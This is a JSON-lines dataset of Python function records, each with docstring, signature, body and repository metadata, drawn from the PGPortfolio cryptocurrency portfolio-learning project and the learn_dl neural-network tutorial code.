{"docstring": "'''Rolling correlation between columns from x and y'''\n", "func_signal": "def rolling_corr(x, y):\n", "code": "def rolling(dataframe):\n    ret = dataframe.copy()\n    for col in ret:\n        ret[col] = ret[col].rolling(window=5).mean()\n    return ret\n\nn, k = x.shape\n\nEX = rolling(x)\nEY = rolling(y)\nEX2 = rolling(x**2)\nEY2 = rolling(y**2)\n\nRXY = np.zeros((n,k,k))\n\nfor i, col_x in enumerate(x):\n    for j, col_y in enumerate(y):\n        DX = EX2[col_x] - EX[col_x] ** 2\n        DY = EY2[col_y] - EY[col_y] ** 2\n        product_xy = x[col_x] * y[col_y]\n        RXY[:, i, j] = product_xy.rolling(window=5).mean()- EX[col_x] * EY[col_y]\n        RXY[:, i, j] = RXY[:, i, j] / np.sqrt(DX * DY)\n\nreturn RXY, EX.values", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/anticor_deprecated.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\nfill nan along the 3rd axis\n:param panel: the panel to be filled\n:param type: bfill or ffill\n\"\"\"\n", "func_signal": "def panel_fillna(panel, type=\"bfill\"):\n", "code": "frames = {}\nfor item in panel.items:\n    if type == \"both\":\n        frames[item] = panel.loc[item].fillna(axis=1, method=\"bfill\").\\\n            fillna(axis=1, method=\"ffill\")\n    else:\n        frames[item] = panel.loc[item].fillna(axis=1, method=type)\nreturn pd.Panel(frames)", "path": "PGPortfolio/pgportfolio/tools/data.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "'''return new portfolio vector\n:param x: input matrix\n:param last_b: last portfolio weight vector\n'''\n", "func_signal": "def decide_by_history(self, x, last_b):\n", "code": "if self.b is None:\n    self.b = np.ones(12) / 12\nelse:\n    self.b = last_b\nreturn self.b", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/ubah.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "'''\n:param K: maximum window size\n:param L: splits into L parts, in each K\n'''\n", "func_signal": "def __init__(self, K=5, L=1, c=0.1, exp_w=None):\n", "code": "super(CORNU, self).__init__()\nself.K = K\nself.L = L\nself.c = c\nself.exp_ret = np.ones((K,L))\nself.exp_w = exp_w", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/cornu.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "'''\n:param w: window sze\n:param c: correlation coefficient threshold\n'''\n", "func_signal": "def update(self, data, w, c):\n", "code": "T, N = data.shape\nm = -1\nhistdata = np.zeros((T,N))\n\nif T <= w+1:\n    return np.ones(N) / N\n\nif w==0:\n    histdata = data[:T,:]\n    m = T\nelse:\n    for i in np.arange(w, T):\n        d1 = data[i-w:i,:].ravel()\n        d2 = data[T-w:T,:].ravel()\n\n        datacorr = np.corrcoef(d1,d2)[1,0]\n\n\n        if datacorr >= c:\n            m += 1\n            histdata[m,:] = data[i,:] #minus one to avoid out of bounds issue\n\nif m==-1:\n    return np.ones(N) / N\n\nb = opt(histdata[:m+1,:])\nreturn b", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/cornu.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param log_file_dir: logging of the training process\n:param index: sub-folder name under train_package\n:return: the result named tuple\n\"\"\"\n", "func_signal": "def train_net(self, log_file_dir=\"./tensorboard\", index=\"0\"):\n", "code": "self.__print_upperbound()\nif log_file_dir:\n    if self.device == \"cpu\":\n        with tf.device(\"/cpu:0\"):\n            self.__init_tensor_board(log_file_dir)\n    else:\n        self.__init_tensor_board(log_file_dir)\nstarttime = time.time()\n\ntotal_data_time = 0\ntotal_training_time = 0\nfor i in range(self.train_config[\"steps\"]):\n    step_start = time.time()\n    x, y, last_w, setw = self.next_batch()\n    finish_data = time.time()\n    total_data_time += (finish_data - step_start)\n    self._agent.train(x, y, last_w=last_w, setw=setw)\n    total_training_time += time.time() - finish_data\n    if i % 1000 == 0 and log_file_dir:\n        logging.info(\"average time for data accessing is %s\"%(total_data_time/1000))\n        logging.info(\"average time for training is %s\"%(total_training_time/1000))\n        total_training_time = 0\n        total_data_time = 0\n        self.log_between_steps(i)\n\nif self.save_path:\n    self._agent.recycle()\n    best_agent = NNAgent(self.config, restore_dir=self.save_path)\n    self._agent = best_agent\n\npv, log_mean = self._evaluate(\"test\", self._agent.portfolio_value, self._agent.log_mean)\nlogging.warning('the portfolio value train No.%s is %s log_mean is %s,'\n                ' the training time is %d seconds' % (index, pv, log_mean, time.time() - starttime))\n\nreturn self.__log_result_csv(index, time.time() - starttime)", "path": "PGPortfolio/pgportfolio/learn/tradertrainer.py", "commit_date": "2018-02-11 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\ntrain all the agents in the train_package folders\n\n:param processes: the number of the processes. If equal to 1, the logging level is debug\n                  at file and info at console. If greater than 1, the logging level is\n                  info at file and warming at console.\n\"\"\"\n", "func_signal": "def train_all(processes=1, device=\"cpu\"):\n", "code": "if processes == 1:\n    console_level = logging.INFO\n    logfile_level = logging.DEBUG\nelse:\n    console_level = logging.WARNING\n    logfile_level = logging.INFO\ntrain_dir = \"train_package\"\nif not os.path.exists(\"./\" + train_dir): #if the directory does not exist, creates one\n    os.makedirs(\"./\" + train_dir)\nall_subdir = os.listdir(\"./\" + train_dir)\nall_subdir.sort()\npool = []\nfor dir in all_subdir:\n    # train only if the log dir does not exist\n    if not str.isdigit(dir):\n        return\n    # NOTE: logfile is for compatibility reason\n    if not (os.path.isdir(\"./\"+train_dir+\"/\"+dir+\"/tensorboard\") or os.path.isdir(\"./\"+train_dir+\"/\"+dir+\"/logfile\")):\n        p = Process(target=train_one, args=(\n            \"./\" + train_dir + \"/\" + dir + \"/netfile\",\n            load_config(dir),\n            \"./\" + train_dir + \"/\" + dir + \"/tensorboard\",\n            dir, logfile_level, console_level, device))\n        p.start()\n        pool.append(p)\n    else:\n        continue\n\n    # suspend if the processes are too many\n    wait = True\n    while wait:\n        time.sleep(5)\n        for p in pool:\n            alive = p.is_alive()\n            if not alive:\n                pool.remove(p)\n        if len(pool)<processes:\n            wait = False\nprint(\"All the Tasks are Over\")", "path": "PGPortfolio/pgportfolio/autotrain/training.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"convert the panel to datatensor (numpy array) without btc\n\"\"\"\n", "func_signal": "def panel2array(panel):\n", "code": "without_btc = np.transpose(panel.values, axes=(2, 0, 1))\nreturn without_btc", "path": "PGPortfolio/pgportfolio/tools/data.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:params b: Constant rebalanced portfolio weights. Default is uniform.\n\"\"\"\n", "func_signal": "def __init__(self, b=None):\n", "code": "super(CRP, self).__init__()\nself.b = b", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/crp.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"normalize the price tensor, whose shape is [features, coins, windowsize]\n@:param m: input tensor, unnormalized and there could be nan in it\n@:param with_y: if the tensor include y (future price)\n    logging.debug(\"price are %s\" % (self._latest_price_matrix[0, :, -1]))\n\"\"\"\n", "func_signal": "def pricenorm3d(m, features, norm_method, fake_ratio=1.0, with_y=True):\n", "code": "result = m.copy()\nif features[0] != \"close\":\n    raise ValueError(\"first feature must be close\")\nfor i, feature in enumerate(features):\n    if with_y:\n        one_position = 2\n    else:\n        one_position = 1\n    pricenorm2d(result[i], m[0, :, -one_position], norm_method=norm_method,\n                fake_ratio=fake_ratio, one_position=one_position)\nreturn result", "path": "PGPortfolio/pgportfolio/tools/data.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\" Update portfolio weights to satisfy constraint b * x <= eps\nand minimize distance to previous weights. \"\"\"\n", "func_signal": "def update(self, b, x, eps, C):\n", "code": "x_mean = np.mean(x)\n\nle = np.maximum(0., np.dot(b, x) - eps)\n\ndenominator = np.square(np.linalg.norm(x-x_mean))\n\nif self.variant == 0:\n    tau = le / denominator\nelif self.variant == 1:\n    tau = np.minimum(C, le / denominator)\nelif self.variant == 2:\n    tau = le / (denominator + 0.5 / C)\n\n# limit lambda to avoid numerical problems\ntau = np.minimum(100000, tau)\n\n# update portfolio\nb = b - tau * (x - x_mean)\n\n# project it onto simplex\nreturn self.simplex_proj(b)", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/pamr.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param feature_number: an int indicates the number of features\n:return: a list of features n\n\"\"\"\n", "func_signal": "def get_type_list(feature_number):\n", "code": "if feature_number == 1:\n    type_list = [\"close\"]\nelif feature_number == 2:\n    type_list = [\"close\", \"volume\"]\n    raise NotImplementedError(\"the feature volume is not supported currently\")\nelif feature_number == 3:\n    type_list = [\"close\", \"high\", \"low\"]\nelif feature_number == 4:\n    type_list = [\"close\", \"high\", \"low\", \"open\"]\nelse:\n    raise ValueError(\"feature number could not be %s\" % feature_number)\nreturn type_list", "path": "PGPortfolio/pgportfolio/tools/data.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param start/end: linux timestamp in seconds\n:param period: time interval of each data access point\n:param features: tuple or list of the feature names\n:return a panel, [feature, coin, time]\n\"\"\"\n", "func_signal": "def get_global_panel(self, start, end, period=300, features=('close',)):\n", "code": "start = int(start - (start%period))\nend = int(end - (end%period))\ncoins = self.select_coins(start=end - self.__volume_forward - self.__volume_average_days * DAY,\n                          end=end-self.__volume_forward)\nself.__coins = coins\nfor coin in coins:\n    self.update_data(start, end, coin)\n\nif len(coins)!=self._coin_number:\n    raise ValueError(\"the length of selected coins %d is not equal to expected %d\"\n                     % (len(coins), self._coin_number))\n\nlogging.info(\"feature type list is %s\" % str(features))\nself.__checkperiod(period)\n\ntime_index = pd.to_datetime(list(range(start, end+1, period)),unit='s')\npanel = pd.Panel(items=features, major_axis=coins, minor_axis=time_index, dtype=np.float32)\n\nconnection = sqlite3.connect(DATABASE_DIR)\ntry:\n    for row_number, coin in enumerate(coins):\n        for feature in features:\n            # NOTE: transform the start date to end date\n            if feature == \"close\":\n                sql = (\"SELECT date+300 AS date_norm, close FROM History WHERE\"\n                       \" date_norm>={start} and date_norm<={end}\" \n                       \" and date_norm%{period}=0 and coin=\\\"{coin}\\\"\".format(\n                       start=start, end=end, period=period, coin=coin))\n            elif feature == \"open\":\n                sql = (\"SELECT date+{period} AS date_norm, open FROM History WHERE\"\n                       \" date_norm>={start} and date_norm<={end}\" \n                       \" and date_norm%{period}=0 and coin=\\\"{coin}\\\"\".format(\n                       start=start, end=end, period=period, coin=coin))\n            elif feature == \"volume\":\n                sql = (\"SELECT date_norm, SUM(volume)\"+\n                       \" FROM (SELECT date+{period}-(date%{period}) \"\n                       \"AS date_norm, volume, coin FROM History)\"\n                       \" WHERE date_norm>={start} and date_norm<={end} and coin=\\\"{coin}\\\"\"\n                       \" GROUP BY date_norm\".format(\n                            period=period,start=start,end=end,coin=coin))\n            elif feature == \"high\":\n                sql = (\"SELECT date_norm, MAX(high)\" +\n                       \" FROM (SELECT date+{period}-(date%{period})\"\n                       \" AS date_norm, high, coin FROM History)\"\n                       \" WHERE date_norm>={start} and date_norm<={end} and coin=\\\"{coin}\\\"\"\n                       \" GROUP BY date_norm\".format(\n                            period=period,start=start,end=end,coin=coin))\n            elif feature == \"low\":\n                sql = (\"SELECT date_norm, MIN(low)\" +\n                        \" FROM (SELECT date+{period}-(date%{period})\"\n                        \" AS date_norm, low, coin FROM History)\"\n                        \" WHERE date_norm>={start} and date_norm<={end} and coin=\\\"{coin}\\\"\"\n                        \" GROUP BY date_norm\".format(\n                            period=period,start=start,end=end,coin=coin))\n            else:\n                msg = (\"The feature %s is not supported\" % feature)\n                logging.error(msg)\n                raise ValueError(msg)\n            serial_data = pd.read_sql_query(sql, con=connection,\n                                            parse_dates=[\"date_norm\"],\n                                            index_col=\"date_norm\")\n            panel.loc[feature, coin, serial_data.index] = serial_data.squeeze()\n            panel = panel_fillna(panel, \"both\")\nfinally:\n    connection.commit()\n    connection.close()\nreturn panel", "path": "PGPortfolio/pgportfolio/marketdata/globaldatamatrix.py", "commit_date": "2019-04-02 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\ntrain an agent\n:param save_path: the path to save the tensorflow model (.ckpt), could be None\n:param config: the json configuration file\n:param log_file_dir: the directory to save the tensorboard logging file, could be None\n:param index: identifier of this train, which is also the sub directory in the train_package,\nif it is 0. nothing would be saved into the summary file.\n:param logfile_level: logging level of the file\n:param console_level: logging level of the console\n:param device: 0 or 1 to show which gpu to use, if 0, means use cpu instead of gpu\n:return : the Result namedtuple\n\"\"\"\n", "func_signal": "def train_one(save_path, config, log_file_dir, index, logfile_level, console_level, device):\n", "code": "if log_file_dir:\n    logging.basicConfig(filename=log_file_dir.replace(\"tensorboard\",\"programlog\"),\n                        level=logfile_level)\n    console = logging.StreamHandler()\n    console.setLevel(console_level)\n    logging.getLogger().addHandler(console)\nprint(\"training at %s started\" % index)\nreturn TraderTrainer(config, save_path=save_path, device=device).train_net(log_file_dir=log_file_dir, index=index)", "path": "PGPortfolio/pgportfolio/autotrain/training.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "'''init\n:param eps: mean reversion threshold\n:param alpha: trade off parameter for moving average\n'''\n", "func_signal": "def __init__(self,  eps=10, alpha=0.5, data_phi=None, b=None):\n", "code": "super(OLMAR2, self).__init__()\nself.eps = eps\nself.alpha = alpha\nself.data_phi = data_phi\nself.b = b", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/olmar2.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param eps: Control parameter for variant 0. Must be >=0, recommended value is\n            between 0.5 and 1.\n:param C: Control parameter for variant 1 and 2. Recommended value is 500.\n:param variant: Variants 0, 1, 2 are available.\n\"\"\"\n", "func_signal": "def __init__(self, eps=0.5, C=500, variant=2, b=None):\n", "code": "super(PAMR, self).__init__()\n\n# input check\nif not(eps >= 0):\n    raise ValueError('epsilon parameter must be >=0')\n\nif variant == 0:\n    if eps is None:\n        raise ValueError('eps parameter is required for variant 0')\nelif variant == 1 or variant == 2:\n    if C is None:\n        raise ValueError('C parameter is required for variant 1,2')\nelse:\n    raise ValueError('variant is a number from 0,1,2')\n\nself.eps = eps\nself.C = C\nself.variant = variant\nself.b = b", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/pamr.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param window: Window parameter.\n:param c_version: Use c_version, up to 10x speed-up.\n\"\"\"\n", "func_signal": "def __init__(self, window=30, c_version=True):\n", "code": "super(ANTICOR, self).__init__()\nself.window = window\nself.c_version = c_version", "path": "PGPortfolio/pgportfolio/tdagent/algorithms/anticor_deprecated.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n:param algo: a string represent index or algo name\n:return : a config dictionary\n\"\"\"\n", "func_signal": "def _config_by_algo(algo):\n", "code": "if not algo:\n    raise ValueError(\"please input a specific algo\")\nelif algo.isdigit():\n    config = load_config(algo)\nelse:\n    config = load_config()\nreturn config", "path": "PGPortfolio/main.py", "commit_date": "2018-06-15 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n\u6309\u7167\u611f\u77e5\u5668\u89c4\u5219\u66f4\u65b0\u6743\u91cd\n\"\"\"\n# \u9996\u5148\u8ba1\u7b97\u672c\u6b21\u66f4\u65b0\u7684delta\n# \u7136\u540e\u628ainput_vec[x1,x2,x3,...]\u5411\u91cf\u4e2d\u7684\u6bcf\u4e2a\u503c\u4e58\u4e0adelta\uff0c\u5f97\u5230\u6bcf\u4e2a\u6743\u91cd\u66f4\u65b0\n# \u6700\u540e\u518d\u628a\u6743\u91cd\u66f4\u65b0\u6309\u5143\u7d20\u52a0\u5230\u539f\u5148\u7684weights[w1,w2,w3,...]\u4e0a\n", "func_signal": "def _update_weights(self, input_vec, output, label, rate):\n", "code": "delta = label - output\nself.weights = VectorOp.element_add(\n    self.weights, VectorOp.scala_multiply(input_vec, rate * delta))\n# \u66f4\u65b0bias\nself.bias += rate * delta", "path": "learn_dl/perceptron.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u4f7f\u7528SGD\u7b97\u6cd5\u66f4\u65b0\u6743\u91cd\n'''\n", "func_signal": "def update(self):\n", "code": "self.W -= self.learning_rate * self.W_grad\nself.b -= self.learning_rate * self.b_grad", "path": "learn_dl/recursive.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u4f7f\u7528\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\u66f4\u65b0\u6743\u91cd\n'''\n", "func_signal": "def update(self, learning_rate):\n", "code": "self.W += learning_rate * self.W_grad\nself.b += learning_rate * self.b_grad", "path": "learn_dl/fc.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\nBPTS\u53cd\u5411\u4f20\u64ad\u7b97\u6cd5\n'''\n", "func_signal": "def backward(self, parent_delta):\n", "code": "self.calc_delta(parent_delta, self.root)\nself.W_grad, self.b_grad = self.calc_gradient(self.root)", "path": "learn_dl/recursive.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u4f7f\u7528\u795e\u7ecf\u7f51\u7edc\u5b9e\u73b0\u9884\u6d4b\nsample: \u8f93\u5165\u6837\u672c\n'''\n", "func_signal": "def predict(self, sample):\n", "code": "output = sample\nfor layer in self.layers:\n    layer.forward(output)\n    output = layer.output\nreturn output", "path": "learn_dl/fc.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u8bad\u7ec3\u51fd\u6570\nlabels: \u6837\u672c\u6807\u7b7e\ndata_set: \u8f93\u5165\u6837\u672c\nrate: \u5b66\u4e60\u901f\u7387\nepoch: \u8bad\u7ec3\u8f6e\u6570\n'''\n", "func_signal": "def train(self, labels, data_set, rate, epoch):\n", "code": "for i in range(epoch):\n    for d in range(len(data_set)):\n        self.train_one_sample(labels[d], \n            data_set[d], rate)", "path": "learn_dl/fc.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "\"\"\"\n\u4f7f\u7528and\u771f\u503c\u8868\u8bad\u7ec3\u611f\u77e5\u5668\n\"\"\"\n# \u521b\u5efa\u611f\u77e5\u5668\uff0c\u8f93\u5165\u53c2\u6570\u4e2a\u6570\u4e3a2\uff08\u56e0\u4e3aand\u662f\u4e8c\u5143\u51fd\u6570\uff09\uff0c\u6fc0\u6d3b\u51fd\u6570\u4e3af\n", "func_signal": "def train_and_perceptron():\n", "code": "p = Perceptron(2, f)\n# \u8bad\u7ec3\uff0c\u8fed\u4ee310\u8f6e, \u5b66\u4e60\u901f\u7387\u4e3a0.1\ninput_vecs, labels = get_training_dataset()\np.train(input_vecs, labels, 10, 0.1)\n# \u8fd4\u56de\u8bad\u7ec3\u597d\u7684\u611f\u77e5\u5668\nreturn p", "path": "learn_dl/perceptron.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u524d\u5411\u8ba1\u7b97\ninput_array: \u8f93\u5165\u5411\u91cf\uff0c\u7ef4\u5ea6\u5fc5\u987b\u7b49\u4e8einput_size\n'''\n# \u5f0f2\n", "func_signal": "def forward(self, input_array):\n", "code": "self.input = input_array\nself.output = self.activator.forward(\n    np.dot(self.W, input_array) + self.b)", "path": "learn_dl/fc.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u6839\u636e\u300e\u5f0f2\u300f\u8fdb\u884c\u524d\u5411\u8ba1\u7b97\n'''\n", "func_signal": "def forward(self, input_array):\n", "code": "self.times += 1\nstate = (np.dot(self.U, input_array) +\n         np.dot(self.W, self.state_list[-1]))\nelement_wise_op(state, self.activator.forward)\nself.state_list.append(state)", "path": "learn_dl/rnn.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u6839\u636ek+1\u65f6\u523b\u7684delta\u8ba1\u7b97k\u65f6\u523b\u7684delta\n'''\n", "func_signal": "def calc_delta_k(self, k, activator):\n", "code": "state = self.state_list[k+1].copy()\nelement_wise_op(self.state_list[k+1],\n            activator.backward)\nself.delta_list[k] = np.dot(\n    np.dot(self.delta_list[k+1].T, self.W),\n    np.diag(state[:,0])).T", "path": "learn_dl/rnn.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "\"\"\"\n\u521d\u59cb\u5316\u611f\u77e5\u5668\uff0c\u8bbe\u7f6e\u8f93\u5165\u53c2\u6570\u7684\u4e2a\u6570\uff0c\u4ee5\u53ca\u6fc0\u6d3b\u51fd\u6570\u3002\n\u6fc0\u6d3b\u51fd\u6570\u7684\u7c7b\u578b\u4e3adouble -> double\n\"\"\"\n", "func_signal": "def __init__(self, input_num, activator):\n", "code": "self.activator = activator\n# \u6743\u91cd\u5411\u91cf\u521d\u59cb\u5316\u4e3a0\nself.weights = [0.0] * input_num\n# \u504f\u7f6e\u9879\u521d\u59cb\u5316\u4e3a0\nself.bias = 0.0", "path": "learn_dl/perceptron.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u68af\u5ea6\u68c0\u67e5\nnetwork: \u795e\u7ecf\u7f51\u7edc\u5bf9\u8c61\nsample_feature: \u6837\u672c\u7684\u7279\u5f81\nsample_label: \u6837\u672c\u7684\u6807\u7b7e\n'''\n# \u8ba1\u7b97\u7f51\u7edc\u8bef\u5dee\n", "func_signal": "def gradient_check(network, sample_feature, sample_label):\n", "code": "network_error = lambda vec1, vec2: \\\n    0.5 * reduce(lambda a, b: a + b,\n                 list(map(lambda v: (v[0] - v[1]) * (v[0] - v[1]),\n                          zip(vec1, vec2))))\n\n# \u83b7\u53d6\u7f51\u7edc\u5728\u5f53\u524d\u6837\u672c\u4e0b\u6bcf\u4e2a\u8fde\u63a5\u7684\u68af\u5ea6\nnetwork.get_gradient(sample_feature, sample_label)\n\n# \u5bf9\u6bcf\u4e2a\u6743\u91cd\u505a\u68af\u5ea6\u68c0\u67e5    \nfor conn in network.connections.connections:\n    # \u83b7\u53d6\u6307\u5b9a\u8fde\u63a5\u7684\u68af\u5ea6\n    actual_gradient = conn.get_gradient()\n\n    # \u589e\u52a0\u4e00\u4e2a\u5f88\u5c0f\u7684\u503c\uff0c\u8ba1\u7b97\u7f51\u7edc\u7684\u8bef\u5dee\n    epsilon = 0.0001\n    conn.weight += epsilon\n    error1 = network_error(network.predict(sample_feature), sample_label)\n\n    # \u51cf\u53bb\u4e00\u4e2a\u5f88\u5c0f\u7684\u503c\uff0c\u8ba1\u7b97\u7f51\u7edc\u7684\u8bef\u5dee\n    conn.weight -= 2 * epsilon  # \u521a\u624d\u52a0\u8fc7\u4e86\u4e00\u6b21\uff0c\u56e0\u6b64\u8fd9\u91cc\u9700\u8981\u51cf\u53bb2\u500d\n    error2 = network_error(network.predict(sample_feature), sample_label)\n\n    # \u6839\u636e\u5f0f6\u8ba1\u7b97\u671f\u671b\u7684\u68af\u5ea6\u503c\n    expected_gradient = (error2 - error1) / (2 * epsilon)\n\n    # \u6253\u5370\n    print('expected gradient: \\t%f\\nactual gradient: \\t%f' % (\n        expected_gradient, actual_gradient))", "path": "learn_dl/python3/bp_flower.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u8ba1\u7b97\u6bcf\u4e2a\u8282\u70b9\u6743\u91cd\u7684\u68af\u5ea6\uff0c\u5e76\u5c06\u5b83\u4eec\u6c42\u548c\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u68af\u5ea6\n'''\n", "func_signal": "def calc_gradient(self, parent):\n", "code": "W_grad = np.zeros((self.node_width, \n                    self.node_width * self.child_count))\nb_grad = np.zeros((self.node_width, 1))\nif not parent.children:\n    return W_grad, b_grad\nparent.W_grad = np.dot(parent.delta, parent.children_data.T)\nparent.b_grad = parent.delta\nW_grad += parent.W_grad\nb_grad += parent.b_grad\nfor child in parent.children:\n    W, b = self.calc_gradient(child)\n    W_grad += W\n    b_grad += b\nreturn W_grad, b_grad", "path": "learn_dl/recursive.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "# \u6bcf\u4e2a\u8282\u70b9\u7684\u8f93\u51fa\u7b97\u6cd5\uff0cN\u5143\u4e00\u6b21\u65b9\u7a0b\u6c42\u548c\n", "func_signal": "def calc_output(self):\n", "code": "output = reduce(lambda ret, conn: ret + conn.upstream_node.output * conn.weight, self.upstream, 0)\n# \u7ed3\u679c\u653e\u5165\u6fc0\u6d3b\u51fd\u6570\nself.output = sigmoid(output)", "path": "learn_dl/python3/bp_flower.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u8ba1\u7b97\u6bcf\u4e2a\u65f6\u523bt\u6743\u91cd\u7684\u68af\u5ea6\n'''\n", "func_signal": "def calc_gradient_t(self, t):\n", "code": "gradient = np.dot(self.delta_list[t],\n    self.state_list[t-1].T)\nself.gradient_list[t] = gradient", "path": "learn_dl/rnn.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "\"\"\"\n\u8f93\u5165\u5411\u91cf\uff0c\u8f93\u51fa\u611f\u77e5\u5668\u7684\u8ba1\u7b97\u7ed3\u679c\n\"\"\"\n# \u8ba1\u7b97\u5411\u91cfinput_vec[x1,x2,x3...]\u548cweights[w1,w2,w3,...]\u7684\u5185\u79ef\n# \u7136\u540e\u52a0\u4e0abias\n", "func_signal": "def predict(self, input_vec):\n", "code": "return self.activator(\n    VectorOp.dot(input_vec, self.weights) + self.bias)", "path": "learn_dl/perceptron.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u53cd\u5411\u8ba1\u7b97W\u548cb\u7684\u68af\u5ea6\ndelta_array: \u4ece\u4e0a\u4e00\u5c42\u4f20\u9012\u8fc7\u6765\u7684\u8bef\u5dee\u9879\n'''\n# \u5f0f8\n", "func_signal": "def backward(self, delta_array):\n", "code": "self.delta = self.activator.backward(self.input) * np.dot(\n    self.W.T, delta_array)\nself.W_grad = np.dot(delta_array, self.input.T)\nself.b_grad = delta_array", "path": "learn_dl/fc.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
